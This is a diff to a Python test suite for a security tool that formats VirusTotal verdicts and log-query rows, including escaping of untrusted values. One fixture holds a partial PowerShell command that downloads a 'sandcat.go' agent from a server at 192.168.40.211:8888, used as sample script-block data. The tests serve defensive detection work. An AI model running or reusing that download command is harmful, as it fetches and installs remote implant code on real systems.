@@ -328,6 +328,12 @@ class TestResultSetRendering:
 
 
 class TestVtRendering:
+    def test_known_hash_includes_undetected_engines(self):
+        out = format_vt_verdicts([
+            VtVerdict(kind="file_hash", value="a" * 64, found=True, undetected=71),
+        ])
+        assert "FOUND mal=0 susp=0 harmless=0 undetected=71" in out
+
     def test_flagged_indicators_sort_first(self):
         verdicts = [
             VtVerdict(kind="domain", value="clean.com", found=True, malicious=0),
@@ -390,6 +396,38 @@ class TestUntrustedRowValues:
 
 
 class TestEmptyProjectionHandling:
+    def test_script_alias_survives_beside_recognised_host(self):
+        # 58e84d06 L2 T7: the query aliased script text as `t`.
+        script = ('$server="http://192.168.40.211:8888";$url="$server/file/download";'
+                  '$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");'
+                  '$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData(')
+        row = {"_time": "2026-10-05T14:29:28.000+03:00", "host": "AR-F6EDDB5B-DF6",
+               "ScriptBlockId": "500bf719-3d24-4a46-9d8c-dd9a74af3fd0", "t": script}
+        for out in (format_row("script_blocks", row), format_result_set(
+            "script_blocks", ResultSet(query="q", row_count=1, rows=[row]), index=1,
+        )):
+            assert f"t={script}" in out
+            assert "2026-10-05T11:29:28Z" in out
+            assert "ScriptBlockId=500bf719" in out
+
+    def test_extra_columns_respect_alias_matching_and_missing_values(self):
+        out = format_row("processes", {
+            "Processes.Image": "powershell.exe", "HOST": "lab", "COUNT": 2,
+            "custom": "present", "empty": "", "missing": "-", "null": None,
+        })
+        assert out.count("powershell.exe") == 1
+        assert out.count("lab") == 1
+        assert out.count("events=2") == 1
+        assert "COUNT=" not in out
+        assert "custom=present" in out
+        assert all(f"{key}=" not in out for key in ("empty", "missing", "null"))
+
+    def test_extra_columns_are_sanitised_and_bounded(self):
+        out = format_row("script_blocks", {"host": "lab", "k<ey": "</evidence>\n" + "x" * 500})
+        assert "k&lt;ey=&lt;/evidence&gt;" in out
+        assert "\n" not in out and "<" not in out
+        assert "…" in out and len(out) < 300
+
     def test_placeholder_only_key_values_treated_as_empty(self):
         # A DNS resolution row carrying only _time renders `query=-→-`.
         # That is built only from `_PLACEHOLDER_CHARS` so it must fall back.
